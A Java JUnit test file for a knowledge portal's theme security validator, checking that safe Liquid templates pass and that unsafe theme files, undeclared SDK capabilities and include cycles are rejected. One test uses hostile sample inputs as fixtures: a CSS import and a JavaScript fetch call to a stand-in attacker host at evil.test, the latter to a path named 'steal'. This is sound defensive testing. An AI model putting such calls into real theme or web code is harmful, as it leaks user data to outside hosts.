package com.kma.knowledge.service;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.Test;

import java.util.LinkedHashMap;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

class PortalThemeSecurityTest {
    private final ObjectMapper objectMapper = new ObjectMapper();

    @Test
    void acceptsLiquidIncludesWidgetsAndRelativeModules() throws Exception {
        Map<String, String> files = new LinkedHashMap<>();
        files.put("layout.html", """
            <header>{% include "partials/nav.html" %}</header>
            <main><kma-slot name="content"></kma-slot></main>
            """);
        files.put("pages/home.html", """
            {% if portal.user %}<kma-widget name="content-list"></kma-widget>{% endif %}
            """);
        files.put("partials/nav.html", "<kma-link to=\"home\">首页</kma-link>");
        files.put("styles/theme.css", ".card { display:grid; }");
        files.put("scripts/theme.js", "import './helper.js';");
        files.put("scripts/helper.js", "export const ready = true;");

        assertThat(PortalThemeSecurity.validate(files, objectMapper.readTree("""
            {"capabilities":["page-context","contents","navigation"],"entry":"layout.html"}
            """))).isEmpty();
    }

    @Test
    void rejectsNetworkEscapeRawOutputAndIncludeCycles() throws Exception {
        Map<String, String> files = new LinkedHashMap<>();
        files.put("layout.html", "{% include \"partials/a.html\" %}<kma-slot name=\"content\" />");
        files.put("pages/home.html", "{{{ portal.user }}}");
        files.put("partials/a.html", "{% include \"partials/b.html\" %}");
        files.put("partials/b.html", "{% include \"partials/a.html\" %}");
        files.put("styles/theme.css", "@import url(https://evil.test/theme.css);");
        files.put("scripts/theme.js", "fetch('https://evil.test/steal')");

        assertThat(PortalThemeSecurity.validate(files, objectMapper.readTree("""
            {"capabilities":["page-context"],"entry":"layout.html"}
            """)))
            .anyMatch(issue -> issue.contains("网络") || issue.contains("fetch"))
            .anyMatch(issue -> issue.contains("原始输出"))
            .anyMatch(issue -> issue.contains("循环"));
    }

    @Test
    void rejectsUndeclaredSdkCapabilityBeforePublish() throws Exception {
        Map<String, String> files = new LinkedHashMap<>();
        files.put("layout.html", "<kma-slot name=\"content\" />");
        files.put("pages/home.html", "<kma-widget name=\"ai-chat\"></kma-widget>");
        files.put("styles/theme.css", "body { color: #123; }");
        files.put("scripts/theme.js", "portal.search.query('党建');");

        assertThat(PortalThemeSecurity.validate(files, objectMapper.readTree("""
            {"capabilities":["page-context"],"entry":"layout.html"}
            """)))
            .anyMatch(issue -> issue.contains("未声明的 SDK 能力: ask"))
            .anyMatch(issue -> issue.contains("未声明的 SDK 能力: search"));
    }
}
